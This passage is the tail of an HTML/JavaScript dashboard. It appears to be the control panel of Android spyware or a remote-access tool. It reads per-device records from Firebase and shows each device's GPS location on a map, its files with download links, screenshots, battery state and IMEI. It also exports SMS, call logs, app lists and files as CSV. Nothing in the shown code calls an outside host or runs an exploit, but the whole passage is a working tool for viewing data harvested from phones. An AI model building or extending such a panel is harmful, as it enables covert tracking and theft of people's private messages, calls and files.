                    cardEl.classList.add('d-none');
                    noDataMsg.textContent = 'No battery data available for this device.';
                    noDataMsg.classList.remove('d-none');
                }
            }, (error) => {
                console.error("Error loading battery info:", error);
                cardEl.classList.add('d-none');
                noDataMsg.textContent = `Error loading battery data: ${error.message}`;
                noDataMsg.classList.remove('d-none');
            });
        }
        
        function initMap() {
            if (!map && document.getElementById('map')) { 
                map = L.map('map').setView([20, 0], 2); 
                L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                    attribution: '© <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                }).addTo(map);
            } else if (map) { 
                 setTimeout(() => map.invalidateSize(), 0);
            }
        }

        function loadLocationData(deviceId) {
            initMap(); 
            const gpsRef = ref(db, `devices/${deviceId}/gps`);
            const noDataMsg = document.getElementById('no-location-message');
            const locDetailsEl = document.getElementById('location-details');
            
            locDetailsEl.classList.add('d-none');
            noDataMsg.classList.add('d-none');

            activeDataListenerUnsubscribe = onValue(gpsRef, (snapshot) => {
                const data = snapshot.val();
                if (data && data.latitude !== undefined && data.longitude !== undefined) {
                    noDataMsg.classList.add('d-none');
                    locDetailsEl.classList.remove('d-none');
                    if(map) setTimeout(() => map.invalidateSize(), 0); 
                    
                    const latLng = [data.latitude, data.longitude];
                    if(map) map.setView(latLng, 15);
                    if (marker && map) {
                        marker.setLatLng(latLng);
                    } else if (map) {
                        marker = L.marker(latLng).addTo(map);
                    }
                    if(marker && map) marker.bindPopup(`<b>${currentDeviceAlias || 'Device'}</b><br>Accuracy: ${data.accuracy || 'N/A'}m<br>Time: ${data.timestamp ? new Date(data.timestamp).toLocaleString() : 'N/A'}`).openPopup();

                    document.getElementById('loc-lat').textContent = data.latitude;
                    document.getElementById('loc-lon').textContent = data.longitude;
                    document.getElementById('loc-acc').textContent = data.accuracy ? `${data.accuracy}m` : 'N/A';
                    document.getElementById('loc-time').textContent = data.timestamp ? new Date(data.timestamp).toLocaleString() : 'N/A';
                } else {
                    locDetailsEl.classList.add('d-none');
                    noDataMsg.textContent = 'No GPS data available for this device.';
                    noDataMsg.classList.remove('d-none');
                    if(map) map.setView([20, 0], 2); 
                    if(marker && map) { marker.remove(); marker = null; }
                }
            }, (error) => {
                console.error("Error loading location data:", error);
                locDetailsEl.classList.add('d-none');
                noDataMsg.textContent = `Error loading location data: ${error.message}`;
                noDataMsg.classList.remove('d-none');
            });
        }

        let filesExportData = [];
        function loadFiles(deviceId) {
            const filesRef = ref(db, `devices/${deviceId}/files`);
            const filesListEl = document.getElementById('files-list');
            const noDataMsg = document.getElementById('no-files-message');
            
            filesListEl.innerHTML = '';
            filesExportData.length = 0;
            noDataMsg.classList.add('d-none');

            activeDataListenerUnsubscribe = onValue(filesRef, (snapshot) => {
                const files = snapshot.val();
                filesListEl.innerHTML = '';
                filesExportData.length = 0;
                if (files && Object.keys(files).length > 0) {
                    noDataMsg.classList.add('d-none');
                    Object.values(files).sort((a,b) => (b.timestamp || b.lastModified || 0) - (a.timestamp || a.lastModified || 0)).forEach(file => { 
                        const fileItem = document.createElement('div');
                        fileItem.classList.add('list-group-item', 'd-flex', 'justify-content-between', 'align-items-center');
                        
                        let iconClass = 'fa-file'; 
                        if (file.type) {
                            if (file.type.startsWith('image')) iconClass = 'fa-file-image';
                            else if (file.type.includes('pdf')) iconClass = 'fa-file-pdf';
                            else if (file.type.startsWith('audio')) iconClass = 'fa-file-audio';
                            else if (file.type.startsWith('video')) iconClass = 'fa-file-video';
                            else if (file.type.includes('archive') || file.type.includes('zip')) iconClass = 'fa-file-archive';
                            else if (file.type.includes('text')) iconClass = 'fa-file-alt';
                        }
                        const fileSize = file.size ? (parseFloat(file.size) / 1024).toFixed(2) + ' KB' : 'N/A';
                        const fileTimestamp = file.timestamp || file.lastModified;

                        fileItem.innerHTML = `
                            <div>
                                <i class="fas ${iconClass} fa-fw file-icon"></i>
                                <span class="fw-semibold">${file.name || 'N/A'}</span>
                                <small class="d-block text-muted">${file.path || 'N/A'} - ${fileSize}</small>
                                <small class="d-block text-muted">Modified: ${fileTimestamp ? new Date(fileTimestamp).toLocaleString() : 'N/A'}</small>
                            </div>
                            ${file.url ? `<a href="${file.url}" target="_blank" class="btn btn-sm btn-outline-primary" title="Download ${file.name}"><i class="fas fa-download"></i></a>` : ''}
                        `;
                        filesListEl.appendChild(fileItem);
                        filesExportData.push({Name: file.name, Path: file.path, Size: fileSize, Type: file.type, URL: file.url || '', Timestamp: fileTimestamp ? new Date(fileTimestamp).toLocaleString() : 'N/A' });
                    });
                } else {
                    noDataMsg.textContent = 'No files data available for this device.';
                    noDataMsg.classList.remove('d-none');
                }
            }, (error) => {
                console.error("Error loading files:", error);
                noDataMsg.textContent = `Error loading files data: ${error.message}`;
                noDataMsg.classList.remove('d-none');
            });
        }
        
        function loadScreenshots(deviceId) {
            const screenshotsRef = ref(db, `devices/${deviceId}/screenshots`);
            const galleryEl = document.getElementById('screenshots-gallery');
            const noDataMsg = document.getElementById('no-screenshots-message');

            galleryEl.innerHTML = '';
            noDataMsg.classList.add('d-none');

            activeDataListenerUnsubscribe = onValue(screenshotsRef, (snapshot) => {
                const screenshots = snapshot.val();
                galleryEl.innerHTML = '';
                if (screenshots && Object.keys(screenshots).length > 0) {
                    noDataMsg.classList.add('d-none');
                    Object.values(screenshots).sort((a,b) => (b.timestamp || 0) - (a.timestamp || 0)).forEach(ss => {
                        const imgContainer = document.createElement('div');
                        imgContainer.classList.add('m-1', 'position-relative');
                        const img = document.createElement('img');
                        img.src = ss.url || 'https://via.placeholder.com/150?text=No+Preview';
                        img.alt = ss.name || 'Screenshot';
                        img.classList.add('img-thumbnail', 'screenshot-img');
                        img.title = `${ss.name || 'Screenshot'}\nTimestamp: ${ss.timestamp ? new Date(ss.timestamp).toLocaleString() : 'N/A'}`;
                        img.onclick = () => window.open(ss.url, '_blank'); 

                        imgContainer.appendChild(img);
                        galleryEl.appendChild(imgContainer);
                    });
                } else {
                    noDataMsg.textContent = 'No screenshots available for this device.';
                    noDataMsg.classList.remove('d-none');
                }
            }, (error) => {
                console.error("Error loading screenshots:", error);
                noDataMsg.textContent = `Error loading screenshots: ${error.message}`;
                noDataMsg.classList.remove('d-none');
            });
        }
        
        function loadDeviceInfo(deviceId) {
            const infoRef = ref(db, `devices/${deviceId}/info`);
            const noDataMsg = document.getElementById('no-deviceinfo-message');
            const cardEl = document.getElementById('device-info-card');

            cardEl.classList.add('d-none');
            noDataMsg.classList.add('d-none');

            activeDataListenerUnsubscribe = onValue(infoRef, (snapshot) => {
                const data = snapshot.val();
                if (data && Object.keys(data).length > 0) {
                    noDataMsg.classList.add('d-none');
                    cardEl.classList.remove('d-none');
                    document.getElementById('info-model').textContent = `Model: ${data.model || 'N/A'}`;
                    document.getElementById('info-manufacturer').textContent = `Manufacturer: ${data.manufacturer || 'N/A'}`;
                    document.getElementById('info-android-version').textContent = `Android Version: ${data.android_version || data.osVersion || 'N/A'}`;
                    document.getElementById('info-imei').textContent = `IMEI: ${data.imei || 'N/A'}`;
                } else {
                    cardEl.classList.add('d-none');
                    noDataMsg.textContent = 'No device information available for this device.';
                    noDataMsg.classList.remove('d-none');
                }
            }, (error) => {
                console.error("Error loading device info:", error);
                cardEl.classList.add('d-none');
                noDataMsg.textContent = `Error loading device info: ${error.message}`;
                noDataMsg.classList.remove('d-none');
            });
        }
        
        // --- UTILITY FUNCTIONS ---
        function formatTimeAgo(timestamp) {
            if (!timestamp) return 'N/A';
            const now = new Date();
            const dateFromTimestamp = new Date(timestamp);
            if (isNaN(dateFromTimestamp.getTime())) return 'Invalid Date'; 

            const secondsPast = (now.getTime() - dateFromTimestamp.getTime()) / 1000;

            if (secondsPast < 0) return 'Future date'; // Handle potential clock sync issues
            if (secondsPast < 60) return `${Math.round(secondsPast)}s ago`;
            if (secondsPast < 3600) return `${Math.round(secondsPast / 60)}m ago`;
            if (secondsPast <= 86400) return `${Math.round(secondsPast / 3600)}h ago`;
            
            const daysPast = Math.round(secondsPast / 86400);
            if (daysPast < 7) return `${daysPast}d ago`;
            
            return dateFromTimestamp.toLocaleDateString();
        }

        function exportToCsv(filename, rows) {
            if (!rows || rows.length === 0) {
                alert("No data available to export.");
                return;
            }
            const processedRows = rows.map(row => typeof row === 'object' && row !== null ? row : { data: row });

            if(processedRows.length === 0 || typeof processedRows[0] !== 'object' || processedRows[0] === null){
                alert("Cannot determine headers for export. Data is not in the expected format.");
                return;
            }

            const header = Object.keys(processedRows[0]).join(',');
            const csvContent = processedRows.map(rowObject => {
                return Object.values(rowObject).map(value => {
                    let strValue = String(value === null || typeof value === 'undefined' ? '' : value);
                    if (strValue.includes(',') || strValue.includes('\n') || strValue.includes('"')) {
                        strValue = `"${strValue.replace(/"/g, '""')}"`;
                    }
                    return strValue;
                }).join(',');
            }).join('\n');

            const blob = new Blob(["\uFEFF" + header + '\n' + csvContent], { type: 'text/csv;charset=utf-8;' }); // Added BOM for Excel
            const link = document.createElement("a");
            if (link.download !== undefined) {
                const url = URL.createObjectURL(blob);
                link.setAttribute("href", url);
                link.setAttribute("download", filename);
                link.style.visibility = 'hidden';
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                URL.revokeObjectURL(url);
            }
        }
        
        document.querySelectorAll('.export-btn').forEach(button => {
            button.addEventListener('click', (e) => {
                if (!currentDeviceUID) {
                    alert("Please select a device first.");
                    return;
                }
                const type = e.target.dataset.type;
                let dataToExport = [];
                let filename = `${currentDeviceAlias || 'device'}_${type}_${new Date().toISOString().split('T')[0]}.csv`;

                switch(type) {
                    case 'sms': dataToExport = smsExportData; break;
                    case 'calls': dataToExport = callsExportData; break;
                    case 'apps': dataToExport = appsExportData; break;
                    case 'files': dataToExport = filesExportData; break;
                    default:
                        alert("Export not configured for this type.");
                        return;
                }
                exportToCsv(filename, dataToExport);
            });
        });

    </script>
</body>
</html>